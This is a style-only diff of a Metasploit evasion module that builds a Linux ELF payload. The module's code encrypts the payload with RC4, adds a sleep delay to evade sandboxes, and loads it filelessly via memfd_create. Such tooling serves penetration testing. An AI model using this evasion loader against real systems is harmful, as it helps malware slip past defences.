@@ -13,23 +13,23 @@ class MetasploitModule < Msf::Evasion
     super(
       update_info(
         info,
-        'Name'           => 'Linux RC4 Encrypted Payload Generator',
-        'Description'    => %q{
+        'Name' => 'Linux RC4 Encrypted Payload Generator',
+        'Description' => %q{
           This module generates a Linux ELF executable with RC4 encryption
           and optional sleep-based sandbox evasion.
 
           The evasion module works on systems with Linux Kernel > 3.17 due to memfd_create support.
-          
+
           Features:
           - RC4 encryption with configurable key
           - Fileless execution via memfd_create
         },
-        'Author'         => ['Massimo Bertocchi'],
-        'License'        => MSF_LICENSE,
-        'Platform'       => 'linux',
-        'Arch'           => [ARCH_X64],
-        'Targets'        => [['Linux x64', {}]],
-        'DefaultTarget'  => 0,
+        'Author' => ['Massimo Bertocchi'],
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => [ARCH_X64],
+        'Targets' => [['Linux x64', {}]],
+        'DefaultTarget' => 0,
       )
     )
 
@@ -40,17 +40,16 @@ class MetasploitModule < Msf::Evasion
   end
 
   def run
-
     raw_payload = payload.encoded
     if raw_payload.blank?
-      fail_with(Failure::BadConfig, "Failed to generate payload")
+      fail_with(Failure::BadConfig, 'Failed to generate payload')
     end
 
     elf_payload = Msf::Util::EXE.to_linux_x64_elf(framework, raw_payload)
-    complete_loader = sleep_evasion( seconds: datastore['SLEEP_TIME']) + rc4_decrypter(data: (in_memory_load(elf_payload) + elf_payload))
+    complete_loader = sleep_evasion(seconds: datastore['SLEEP_TIME']) + rc4_decrypter(data: (in_memory_load(elf_payload) + elf_payload))
     final_elf = Msf::Util::EXE.to_linux_x64_elf(framework, complete_loader)
+
     File.binwrite(datastore['FILENAME'], final_elf)
     File.chmod(0755, datastore['FILENAME'])
-
   end
 end
